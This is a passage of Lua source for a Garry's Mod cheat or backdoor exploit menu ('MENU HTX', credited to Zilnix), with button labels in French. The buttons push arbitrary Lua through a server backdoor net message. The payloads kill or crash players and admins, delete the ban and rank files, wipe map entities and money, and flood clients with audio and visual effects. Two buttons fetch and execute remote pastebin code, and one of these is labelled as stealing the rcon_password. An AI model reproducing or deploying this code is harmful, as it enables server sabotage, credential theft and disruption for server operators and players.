if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(0,150),math.random(0,150),math.random(0,150)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function FAUCHEUSE.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y + 15 )
TButton:SetText( btext )
TButton:SetFont( "TargetIDSmall" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 26 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
FAUCHEUSE.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function FAUCHEUSE.HTXCommandeListe()
if FAUCHEUSE.HTXCommandeSelector and FAUCHEUSE.HTXCommandeSelector:IsVisible() then FAUCHEUSE.HTXCommandeSelector:Remove() end
FAUCHEUSE.HTXCommandeSelector = vgui.Create("DFrame")
FAUCHEUSE.HTXCommandeSelector:SetSize(550,550)
FAUCHEUSE.HTXCommandeSelector:SetTitle("Created By Zilnix")
FAUCHEUSE.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
FAUCHEUSE.HTXCommandeSelector:MakePopup()
FAUCHEUSE.HTXCommandeSelector.Paint = function( s, w, h )
surface.SetDrawColor( Color(0, 0, 0, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(0, 0, 0, 200) )
surface.DrawRect( 70, 80, w - 130, h - 20 )
surface.SetDrawColor( Color(255, 255, 255, 255))
surface.DrawOutlinedRect( 70, 80, w - 130, h - 20 )
surface.DrawOutlinedRect( 71, 81, w - 132, h - 22 )
surface.SetDrawColor( Color(255, 255, 255, 200))
draw.DrawText( "MENU HTX", "Trebuchet24", 240, 2, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
end
local DScrollPanel = vgui.Create( "DScrollPanel", FAUCHEUSE.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local zilnixestbo1 = vgui.Create("DButton", DScrollPanel)
zilnixestbo1:SetSize( 350, 20 )
zilnixestbo1:SetPos( 100, 175 )
zilnixestbo1:SetText("Tuer tous les joueurs")
zilnixestbo1:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo1.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo2 = vgui.Create("DButton", DScrollPanel)
zilnixestbo2:SetSize( 350, 20 )
zilnixestbo2:SetPos( 100, 100 )
zilnixestbo2:SetText("Super-Spam Visuel/Sonore 2")
zilnixestbo2:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo2.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo3 = vgui.Create("DButton", DScrollPanel )
zilnixestbo3:SetSize( 350, 20 )
zilnixestbo3:SetPos( 100, 125 )
zilnixestbo3:SetText("Débannir tout les bannis")
zilnixestbo3:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo3.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo4 = vgui.Create("DButton", DScrollPanel )
zilnixestbo4:SetSize( 350, 20 )
zilnixestbo4:SetPos( 100, 150 )
zilnixestbo4:SetText("Ignite tous les joueurs")
zilnixestbo4:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo4.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo4.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo5 = vgui.Create("DButton", DScrollPanel )
zilnixestbo5:SetSize( 350, 20 )
zilnixestbo5:SetPos( 100, 475 )
zilnixestbo5:SetText("Supprimer les grades")
zilnixestbo5:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo5.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo5.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo6 = vgui.Create("DButton", DScrollPanel )
zilnixestbo6:SetSize( 350, 20 )
zilnixestbo6:SetPos( 100, 375 )
zilnixestbo6:SetText("Redémarrer le serveur")
zilnixestbo6:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo6.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo6.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("RunConsoleCommand(\"changelevel \"..game.GetMap())")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo7 = vgui.Create("DButton", DScrollPanel)
zilnixestbo7:SetSize( 350, 20 )
zilnixestbo7:SetPos( 100, 200 )
zilnixestbo7:SetText("Hurlement sur tous les joueurs")
zilnixestbo7:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo7.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo7.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo8 = vgui.Create("DButton", DScrollPanel)
zilnixestbo8:SetSize( 350, 20 )
zilnixestbo8:SetPos( 100, 225 )
zilnixestbo8:SetText("Changer le model des joueurs")
zilnixestbo8:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo8.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo8.DoClick = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo9 = vgui.Create("DButton", DScrollPanel)
zilnixestbo9:SetSize( 350, 20 )
zilnixestbo9:SetPos( 100, 250 )
zilnixestbo9:SetText("Niquer la physics du jeu")
zilnixestbo9:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo9.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo9.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo10 = vgui.Create("DButton", DScrollPanel)
zilnixestbo10:SetSize( 350, 20 )
zilnixestbo10:SetPos( 100, 275 )
zilnixestbo10:SetText("Inverser la gravité")
zilnixestbo10:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo10.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo10.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo11 = vgui.Create("DButton", DScrollPanel)
zilnixestbo11:SetSize( 350, 20 )
zilnixestbo11:SetPos( 100, 300 )
zilnixestbo11:SetText("Reset tout l'argent du serveur")
zilnixestbo11:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo11.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo11.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo12 = vgui.Create("DButton", DScrollPanel)
zilnixestbo12:SetSize( 350, 20 )
zilnixestbo12:SetPos( 100, 325 )
zilnixestbo12:SetText("Faire voler tous les joueurs")
zilnixestbo12:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo12.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo12.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo13 = vgui.Create("DButton", DScrollPanel)
zilnixestbo13:SetSize( 350, 20 )
zilnixestbo13:SetPos( 100, 350 )
zilnixestbo13:SetText("Crash tous les admins/vip")
zilnixestbo13:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo13.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo13.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo14 = vgui.Create("DButton", DScrollPanel)
zilnixestbo14:SetSize( 350, 20 )
zilnixestbo14:SetPos( 100, 75 )
zilnixestbo14:SetText("Coup De Faucheuse")
zilnixestbo14:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo14.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo14.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/6q1X9cGX\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo15 = vgui.Create("DButton", DScrollPanel)
zilnixestbo15:SetSize( 350, 20 )
zilnixestbo15:SetPos( 100, 400 )
zilnixestbo15:SetText("Give 10000000000€ a tous le monde a l'infini")
zilnixestbo15:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo15.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo15.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000000) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo16 = vgui.Create("DButton", DScrollPanel)
zilnixestbo16:SetSize( 350, 20 )
zilnixestbo16:SetPos( 100, 425 )
zilnixestbo16:SetText("Voler le rcon_password")
zilnixestbo16:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo16.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo16.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/ZwFkRHvQ\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if FAUCHEUSE.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end
end)
end
local zilnixestbo17 = vgui.Create("DButton", DScrollPanel)
zilnixestbo17:SetSize( 350, 20 )
zilnixestbo17:SetPos( 100, 450 )
zilnixestbo17:SetText("☢ Supprimer Toutes les Entité ☢")
zilnixestbo17:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo17.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo17.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo18 = vgui.Create("DButton", DScrollPanel)
zilnixestbo18:SetSize( 350, 20 )
zilnixestbo18:SetPos( 100, 500 )
zilnixestbo18:SetText("Faire danser tous le monde")
zilnixestbo18:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo18.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo18.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create(\"dance_loop\",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo19 = vgui.Create("DButton", DScrollPanel)
zilnixestbo19:SetSize( 350, 20 )
zilnixestbo19:SetPos( 100, 525 )
zilnixestbo19:SetText("Shy Kid I Don't Want To Die")
zilnixestbo19:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo19.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo19.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/shykid.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo20 = vgui.Create("DButton", DScrollPanel)
zilnixestbo20:SetSize( 350, 20 )
zilnixestbo20:SetPos( 100, 550 )
zilnixestbo20:SetText("GunGaleOnline")
zilnixestbo20:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo20.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo20.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/GunGaleOnline.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo21 = vgui.Create("DButton", DScrollPanel)
zilnixestbo21:SetSize( 350, 20 )
zilnixestbo21:SetPos( 100, 575 )
zilnixestbo21:SetText("Mother Rosario")
zilnixestbo21:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo21.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo21.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/MotherRosario.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo22 = vgui.Create("DButton", DScrollPanel)
zilnixestbo22:SetSize( 350, 20 )
zilnixestbo22:SetPos( 100, 600 )
zilnixestbo22:SetText("Alfheim Online")
zilnixestbo22:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo22.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo22.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/SAO2.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo23 = vgui.Create("DButton", DScrollPanel)
zilnixestbo23:SetSize( 350, 20 )
zilnixestbo23:SetPos( 100, 625 )
zilnixestbo23:SetText("Sword Art Online")
zilnixestbo23:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo23.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo23.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/SAOOpening.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo24 = vgui.Create("DButton", DScrollPanel)
zilnixestbo24:SetSize( 350, 20 )
zilnixestbo24:SetPos( 100, 650 )
zilnixestbo24:SetText("Break Beat Bark")
zilnixestbo24:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo24.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo24.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/SAOBreakBeatBark.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo25 = vgui.Create("DButton", DScrollPanel)
zilnixestbo25:SetSize( 350, 20 )
zilnixestbo25:SetPos( 100, 675 )
zilnixestbo25:SetText("Tule")
zilnixestbo25:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo25.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo25.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Tule.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo26 = vgui.Create("DButton", DScrollPanel)
zilnixestbo26:SetSize( 350, 20 )
zilnixestbo26:SetPos( 100, 700 )
zilnixestbo26:SetText("Martin Garrix Wi")
zilnixestbo26:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo26.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo26.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/wi.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo27 = vgui.Create("DButton", DScrollPanel)
zilnixestbo27:SetSize( 350, 20 )
zilnixestbo27:SetPos( 100, 725 )
zilnixestbo27:SetText("SwordLand")
zilnixestbo27:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo27.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo27.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/swordland.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo28 = vgui.Create("DButton", DScrollPanel)
zilnixestbo28:SetSize( 350, 20 )
zilnixestbo28:SetPos( 100, 750 )
zilnixestbo28:SetText("Ordinal Scale")
zilnixestbo28:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo28.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo28.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Ordinalscale.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo29 = vgui.Create("DButton", DScrollPanel)
zilnixestbo29:SetSize( 350, 20 )
zilnixestbo29:SetPos( 100, 775 )
zilnixestbo29:SetText("Question Assassination Classroom")
zilnixestbo29:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo29.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo29.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/Question.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end

local zilnixestbo29 = vgui.Create("DButton", DScrollPanel)
zilnixestbo29:SetSize( 350, 20 )
zilnixestbo29:SetPos( 100, 800 )
zilnixestbo29:SetText("Musique Epic Assassination Classroom")
zilnixestbo29:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo29.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo29.DoClick = function()
net.Start(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/Zilnix/EpicAssassin.mp3\", \"mono\", function()end )]])") 
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo30 = vgui.Create("DButton", DScrollPanel)
zilnixestbo30:SetSize( 350, 20 )
